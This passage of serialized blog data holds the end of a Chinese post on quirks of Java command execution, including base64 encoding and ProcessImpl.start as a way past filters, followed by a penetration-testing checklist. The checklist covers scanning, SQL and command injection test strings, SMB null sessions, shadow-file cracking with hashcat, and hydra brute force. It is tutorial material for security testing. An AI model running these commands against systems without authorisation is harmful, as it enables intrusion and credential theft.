NullPointerException();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = command;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。&lt;/p&gt;\n&lt;p&gt;原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。&lt;/p&gt;\n&lt;p&gt;所以Java下的命令稍微改造一下代码就好。&lt;/p&gt;\n&lt;p&gt;还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/24.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;小结\&quot;&gt;小结&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#小结\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。&lt;/p&gt;\n&lt;p&gt;所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。&lt;/p&gt;\n&lt;p&gt;java的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;前言&quot;],&quot;text&quot;:[0,&quot;前言&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;差别&quot;],&quot;text&quot;:[0,&quot;差别&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;小结&quot;],&quot;text&quot;:[0,&quot;小结&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/15&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/common-process-for-handling-objectives&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2023-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Nmap基本扫描\n```\nnmap -Pn -p- -vv\nnmap -Pn -p- -sU -vv\n```\n***\n# 针对端口指纹和漏洞的扫描\n```\nNmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &lt;ip address&gt;\n# 使用nc查看banner\nnc -nv &lt;ip-address&gt; &lt;port&gt;\n```\n***\n# 针对 web 端口的枚举\n```\nNikto -port {web ports} -host &lt;ip address&gt; -o &lt;output file.txt&gt;\n# 目录扫描\nDirb http{s}://&lt;ip address&gt;:&lt;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt\nGobuster -u http://&lt;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt\n#如果想测试文件包含漏洞，可以使用 fimap：\nfimap -u &lt;ip-address&gt;\n```\n***\n# 针对已知的服务进行攻击尝试，搜索漏洞信息\n```\nSearchsploit &lt;service name&gt;\n```\n漏洞来源：\n&lt;https://www.securityfocus.com/vulnerabilities&gt;\n***\n# 针对 web 页面的测试\n检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项\n```\n测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）\n● NULL 或 null\n● &#39;, \&quot;, ;, &lt;!\n  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入\n● -, =, +, \&quot;\n  ○ 用于手工 SQL 注入测试\n● &#39;, &amp;, ! , ¦ , &lt; , &gt;\n  ○ 用于找出命令执行漏洞\n● ../\n  ○ 目录穿越漏洞\n```\n***\n# 针对 NETBIOS、SMB、RPC 端口的测试\n```\nenum4linux -a &lt;ip address&gt; Rpcclient &lt;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &lt;target ip&gt;\n```\n关于 RPC 历史漏洞的合集：\nhttp://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\n以下是常用的远程测试命令\n```\nShowmount -e &lt;ip address&gt;/&lt;port&gt; \nMount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=”guest”,password=”” \nRlogin &lt;ip-address&gt; Smbclient -L &lt;ip-address&gt; -U “” -N Nbtscan -r &lt;ip address&gt; \nNet use &lt;ip-address&gt;$Share “” /u:”” \nNet view &lt;ip-address&gt;\n```\n还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS\n***\n# 针对 SMTP 端口的尝试\n枚举用户，使用 VRFY 和 EXPN 命令\n***\n# 针对 SNMP 端口的测试\n默认共享名称如：public, private, cisco, manager\n使用工具：\n```\nOnesixtyone –c &lt;community list file&gt; -I &lt;ip-address&gt; Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &lt;ip address&gt;\n# 默认 MIB：\n1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports\n# 比如枚举运行的进程\nnmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2\n```\n***\n# 针对 FTP 端口测试\n```\n● anonymous 是否可以登录\n● 如果可以登录是否可以使用 get 或 send 操作文件\n● 使用浏览器是否可以访问，ftp://&lt;ip-address&gt;\n```\n***\n# 密码破解\n在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：\n```\nunshadow [passwd-file] [shadow-file] &gt; unshadowed.txt\n# 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash\nhashcat -m 400 -a 0 &lt;hash file&gt; &lt;wordlist file&gt;\n# 对于其他服务，可以使用 Medusa 或 hydra\nHydra -L &lt;username file&gt; -P &lt;Password file&gt; -v &lt;ip-address&gt; ssh \nMedusa -h &lt;ip-address&gt; -U &lt;username file&gt; -P &lt;password file&gt; -M http -m DIR:/admin -T 30\n```\n***\n# 数据包抓取\n使用 wireshark / tcpdump 获取目标主机的流量\n```\ntcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv\n```\n\n\n***\n# 参考资料\nNMAP Cheatsheet\n&lt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&gt;\nExploit-DB\n&lt;https://www.exploit-db.com/&gt;\nKernel Exploits \n&lt;https://www.kernel-exploits.com/&gt;\nPrivilege Escalation Linux\n&lt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&gt;\n&lt;Linux Pentest Commands\n&lt;http://www.networkpentest.net/p/linuxunix-command-list.html&gt;\nWindows Command Line Cheatsheet\n&lt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&gt;\nPrivilege Escalation Windows:\n&lt;http://www.fuzzysecurity.com/tutorials/16.html&gt;\n&lt;http://toshellandback.com/2015/11/24/ms-priv-esc/&gt;\nWindows Priv Esc cheatsheet\n&lt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&gt;\nPentest References:\n&lt;http://www.vulnerabilityassessment.co.uk/&gt;\n&lt;http://www.0daysecurity.com/penetration-testing/enumeration.html&gt;\nReverse Shell:\n&lt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&gt;\n&lt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&gt;\n&lt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&gt;\n&lt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&gt;\nShell Escape:\n&lt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;http://pentestmonkey.net/category/cheat-sheet&gt;&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Common process for handling objectives.md&quot;],&quot;digest&quot;:[0,&quot;b8b8ecbbb1bd4d31&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;nmap基本扫描\&quot;&gt;Nmap基本扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap基本扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -vv&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -sU -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对端口指纹和漏洞的扫描\&quot;&gt;针对端口指纹和漏洞的扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对端口指纹和漏洞的扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 使用nc查看banner&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv &amp;#x3C;ip-address&gt; &amp;#x3C;port&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-端口的枚举\&quot;&gt;针对 web 端口的枚举&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-端口的枚举\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nikto -port {web ports} -host &amp;#x3C;ip address&gt; -o &amp;#x3C;output file.txt&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 目录扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Dirb http{s}://&amp;#x3C;ip address&gt;:&amp;#x3C;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Gobuster -u http://&amp;#x3C;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#如果想测试文件包含漏洞，可以使用 fimap：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;fimap -u &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;针对已知的服务进行攻击尝试，搜索漏洞信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;漏洞来源：\n&lt;a href=\&quot;https://www.securityfocus.com/vulnerabilities\&quot;&gt;https://www.securityfocus.com/vulnerabilities&lt;/a&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-页面的测试\&quot;&gt;针对 web 页面的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-页面的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● NULL 或 null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, \&quot;, ;, &amp;#x3C;!&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● -, =, +, \&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于手工 SQL 注入测试&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, &amp;#x26;, ! , ¦ , &amp;#x3C; , &gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于找出命令执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● ../&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 目录穿越漏洞&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-netbiossmbrpc-端口的测试\&quot;&gt;针对 NETBIOS、SMB、RPC 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-netbiossmbrpc-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux -a &amp;#x3C;ip address&gt; Rpcclient &amp;#x3C;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &amp;#x3C;target ip&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;关于 RPC 历史漏洞的合集：\n&lt;a href=\&quot;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\&quot;&gt;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/&lt;/a&gt;\n以下是常用的远程测试命令&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Showmount -e &amp;#x3C;ip address&gt;/&amp;#x3C;port&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Mount -t cifs //&amp;#x3C;server ip&gt;/&amp;#x3C;share&gt; &amp;#x3C;local dir&gt; -o username=”guest”,password=”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Rlogin &amp;#x3C;ip-address&gt; Smbclient -L &amp;#x3C;ip-address&gt; -U “” -N Nbtscan -r &amp;#x3C;ip address&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net use &amp;#x3C;ip-address&gt;$Share “” /u:”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net view &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-smtp-端口的尝试\&quot;&gt;针对 SMTP 端口的尝试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-smtp-端口的尝试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;枚举用户，使用 VRFY 和 EXPN 命令&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-snmp-端口的测试\&quot;&gt;针对 SNMP 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-snmp-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;默认共享名称如：public, private, cisco, manager\n使用工具：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Onesixtyone –c &amp;#x3C;community list file&gt; -I &amp;#x3C;ip-address&gt; Snmpwalk -c &amp;#x3C;community string&gt; -v&amp;#x3C;version&gt; &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 默认 MIB：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 比如枚举运行的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-ftp-端口测试\&quot;&gt;针对 FTP 端口测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-ftp-端口测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● anonymous 是否可以登录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 如果可以登录是否可以使用 get 或 send 操作文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 使用浏览器是否可以访问，ftp://&amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;密码破解\&quot;&gt;密码破解&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#密码破解\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow [passwd-file] [shadow-file] &gt; unshadowed.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hashcat -m 400 -a 0 &amp;#x3C;hash file&gt; &amp;#x3C;wordlist file&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 对于其他服务，可以使用 Medusa 或 hydra&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hydra -L &amp;#x3C;username file&gt; -P &amp;#x3C;Password file&gt; -v &amp;#x3C;ip-address&gt; ssh &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Medusa -h &amp;#x3C;ip-address&gt; -U &amp;#x3C;username file&gt; -P &amp;#x3C;password file&gt; -M http -m DIR:/admin -T 30&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;数据包抓取\&quot;&gt;数据包抓取&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#数据包抓取\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;使用 wireshark / tcpdump 获取目标主机的流量&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;tcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;参考资料\&quot;&gt;参考资料&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#参考资料\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;NMAP Cheatsheet\n&lt;a href=\&quot;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf\&quot;&gt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&lt;/a&gt;\nExploit-DB\n&lt;a href=\&quot;https://www.exploit-db.com/\&quot;&gt;https://www.exploit-db.com/&lt;/a&gt;\nKernel Exploits\n&lt;a href=\&quot;https://www.kernel-exploits.com/\&quot;&gt;https://www.kernel-exploits.com/&lt;/a&gt;\nPrivilege Escalation Linux\n&lt;a href=\&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\&quot;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;\n&amp;#x3C;Linux Pentest Commands\n&lt;a href=\&quot;http://www.networkpentest.net/p/linuxunix-command-list.html\&quot;&gt;http://www.networkpentest.net/p/linuxunix-command-list.html&lt;/a&gt;\nWindows Command Line Cheatsheet\n&lt;a href=\&quot;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf\&quot;&gt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&lt;/a&gt;\nPrivilege Escalation Windows:\n&lt;a href=\&quot;http://www.fuzzysecurity.com/tutorials/16.html\&quot;&gt;http://www.fuzzysecurity.com/tutorials/16.html&lt;/a&gt;\n&lt;a href=\&quot;http://toshellandback.com/2015/11/24/ms-priv-esc/\&quot;&gt;http://toshellandback.com/2015/11/24/ms-priv-esc/&lt;/a&gt;\nWindows Priv Esc cheatsheet\n&lt;a href=\&quot;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html\&quot;&gt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&lt;/a&gt;\nPentest References:\n&lt;a href=\&quot;http://www.vulnerabilityassessment.co.uk/\&quot;&gt;http://www.vulnerabilityassessment.co.uk/&lt;/a&gt;\n&lt;a href=\&quot;http://www.0daysecurity.com/penetration-testing/enumeration.html\&quot;&gt;http://www.0daysecurity.com/penetration-testing/enumeration.html&lt;/a&gt;\nReverse 